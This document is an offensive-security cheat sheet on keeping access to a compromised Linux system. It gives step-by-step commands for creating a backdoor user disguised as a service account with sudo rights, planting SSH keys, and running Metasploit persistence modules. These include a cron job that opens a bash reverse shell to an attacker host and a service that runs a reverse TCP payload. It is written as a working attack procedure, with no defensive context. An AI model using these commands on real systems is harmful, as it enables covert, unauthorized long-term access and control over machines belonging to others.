Persistence refers to maintaining access to a compromised system even after a reboot, user logoff, or other interruptions.


## Creating a Backdoor User

A common persistence technique is creating a backdoor user with elevated privileges or root access. If SSH is enabled, the attacker can create a user that looks like a service account or a legitimate system user.

1. **Create a Backdoor User**
```bash
sudo useradd -m -s /bin/bash <username>
```

2. **Set a password**
```bash
sudo passwd <username>
```

3. **Change User UID (Optional)**
```bash
sudo usermod -u <target_uid> <username>
```

4. **Add the User to the Sudoers File**
```bash
sudo usermod -aG sudo <username>
```

## Using SSH Keys for Persistence
SSH keys provide a more secure and stealthy method of maintaining access to a Linux system. By copying your public SSH key to the target system, you can log in without needing to know the password.

1. **Generate SSH Key Pair**
```bash
ssh-keygen -t rsa -b 2048
```

2. **Copy the Public Key to the Target**
```bash
ssh-copy-id <username>@<target_ip>
```

3. **Verify Access**
```bash
ssh <username>@<target_ip>
```


## Metasploit

Metasploit provides several modules to establish persistence on Linux systems. Some of the most commonly used modules are `cron_persistence`, `service_persistence`, and `sshkey_persistence`.

#### cron_persistence
This module sets up a cron job that runs a specified payload at regular intervals, even if the system is rebooted.

```bash
use post/linux/manage/cron_persistence
set session <session_id>
set cmd "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1"
run
```

#### service_persistence
This module adds a new system service that starts automatically when the system boots. The service runs a payload, providing persistent access.

```bash
use post/linux/manage/service_persistence
set session <session_id>
set service_name "malicious_service"
set payload linux/x86/shell_reverse_tcp
set lhost <attacker_ip>
set lport <attacker_port>
run
```

#### sshkey_persistence
This module adds an SSH key to the target system, allowing the attacker to log in without a password.

```bash
use post/linux/manage/sshkey_persistence
set session <session_id>
set sshkey <path_to_public_key>
run
```